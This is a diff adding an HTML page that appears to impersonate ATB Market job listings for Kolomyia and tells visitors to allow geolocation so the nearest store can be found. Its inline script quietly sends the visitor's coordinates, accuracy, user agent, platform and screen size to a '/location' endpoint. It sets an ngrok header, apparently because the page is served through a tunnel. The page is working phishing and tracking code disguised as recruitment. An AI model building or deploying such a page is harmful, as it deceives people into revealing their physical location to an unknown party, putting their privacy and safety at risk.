@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>АТБ Маркет</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <p style="background-color: #3e3f43; margin: 0; padding: 0;"><img src="logo.svg" alt="АТБ"></p>
+    <h1 style="background-image: url('atb.jpg'); margin: 0; padding: 0;">Приєднатися до команди мрії в новому магазині смт. Кути</h1>
+    <b></b>
+    <br>
+    <span id="status"><b>ДОЗВОЛЬТЕ ДОСТУП ДО ВАШОЇ ГЕОЛОКАЦІЇ, ЩОБ ПІДІБРАТИ НАЙБЛИЩИЙ МАГАЗИН ДО ВАС</b></span>
+    <p>Наразі активних вакансій у вашому населеному пункті нема. Пропонуємо, вам, переглянути вакансії поблизу де вже є відкриті магазини мережі АТБ</p>
+    
+
+        <div class="job-card">
+        <div class="job-title">Продавець-консультант</div>
+        <p style="display: inline-flex;"><b>Заробітня плата від 15 до 17 тисяч гривень та безкоштовне медичне страхування</b></p>
+        <div class="job-info">
+            <div class="info-item">
+                <img src="location-icon.png" alt="Місцезнаходження" width="16" height="16">
+                <span>Коломия</span>
+            </div>
+            <div class="info-item">
+                <img src="clock-icon.png" alt="Графік роботи" width="16" height="16">
+                <span>Повна зайнятість</span>
+            </div>
+        </div>
+    </div>
+
+            <div class="job-card">
+        <div class="job-title">Молодший приймальник товарів</div>
+        <p style="display: inline-flex;"><b>Заробітня плата від 13 до 15 тисяч гривень та безкоштовне медичне страхування</b></p>
+        <div class="job-info">
+            <div class="info-item">
+                <img src="location-icon.png" alt="Місцезнаходження" width="16" height="16">
+                <span>Коломия</span>
+            </div>
+            <div class="info-item">
+                <img src="clock-icon.png" alt="Графік роботи" width="16" height="16">
+                <span>Повна зайнятість</span>
+            </div>
+        </div>
+    </div>
+
+            <div class="job-card">
+        <div class="job-title">Керуючий магазином</div>
+        <p style="display: inline-flex;"><b>Заробітня плата від 20 до 25 тисяч гривень та безкоштовне медичне страхування</b></p>
+        <div class="job-info">
+            <div class="info-item">
+                <img src="location-icon.png" alt="Місцезнаходження" width="16" height="16">
+                <span>Коломия</span>
+            </div>
+            <div class="info-item">
+                <img src="clock-icon.png" alt="Графік роботи" width="16" height="16">
+                <span>Повна зайнятість</span>
+            </div>
+        </div>
+    </div>
+
+            <div class="job-card">
+        <div class="job-title">Молодший приймальник товарів, вантажник</div>
+        <p style="display: inline-flex;"><b>Заробітня плата від 13 до 17 тисяч гривень та безкоштовне медичне страхування</b></p>
+        <div class="job-info">
+            <div class="info-item">
+                <img src="location-icon.png" alt="Місцезнаходження" width="16" height="16">
+                <span>Коломия</span>
+            </div>
+            <div class="info-item">
+                <img src="clock-icon.png" alt="Графік роботи" width="16" height="16">
+                <span>Повна зайнятість</span>
+            </div>
+        </div>
+    </div>
+
+            <div class="job-card">
+        <div class="job-title">Адміністратор залу (нічна зміна)</div>
+        <p style="display: inline-flex;"><b>Заробітня плата від 15 до 17 тисяч гривень та безкоштовне медичне страхування</b></p>
+        <div class="job-info">
+            <div class="info-item">
+                <img src="location-icon.png" alt="Місцезнаходження" width="16" height="16">
+                <span>Коломия</span>
+            </div>
+            <div class="info-item">
+                <img src="clock-icon.png" alt="Графік роботи" width="16" height="16">
+                <span>Повна зайнятість</span>
+            </div>
+        </div>
+    </div>
+
+
+
+    <script>
+    const statusEl = document.getElementById('status');
+
+    function sendToServer(geo = null) {
+      const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: {
+          width: screen.width,
+          height: screen.height
+        },
+        geoAllowed: !!geo
+      };
+
+      if (geo) {
+        data.latitude = geo.coords.latitude;
+        data.longitude = geo.coords.longitude;
+        data.accuracy = geo.coords.accuracy;
+      }
+
+      fetch('/location', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json',
+            'ngrok-skip-browser-warning': '1'
+        },
+        body: JSON.stringify(data)
+      });
+    }
+
+    function success(position) {
+      const { latitude, longitude, accuracy } = position.coords;
+      statusEl.textContent;
+      sendToServer(position);
+    }
+
+    function error(err) {
+      statusEl.textContent;
+      sendToServer(null);
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(success, error);
+    } else {
+      statusEl.textContent;
+      sendToServer(null);
+    }
+  </script>
+
+
+</body>
+</html>
